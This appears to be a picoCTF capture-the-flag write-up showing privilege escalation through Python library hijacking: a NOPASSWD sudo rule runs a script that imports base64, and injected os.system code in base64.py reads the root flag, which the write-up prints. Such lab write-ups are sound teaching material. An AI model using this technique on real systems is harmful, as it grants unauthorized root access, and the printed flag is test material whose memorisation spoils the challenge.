# escalation
picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

---

User picoctf may run the following commands on challenge:
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
We can run .server.py without password, but it is readonly.

---

import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip)
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info)
We can instead edit python libraries.

---

vi /lib/python3.8/base64.py
Add these lines

---

import os
os.system('cat /root/.flag.txt')
Run the python file.

---

sudo /usr/bin/python3 /home/picoctf/.server.py
picoCTF{pYth0nn_libraryH!j@CK!n9_6924176e}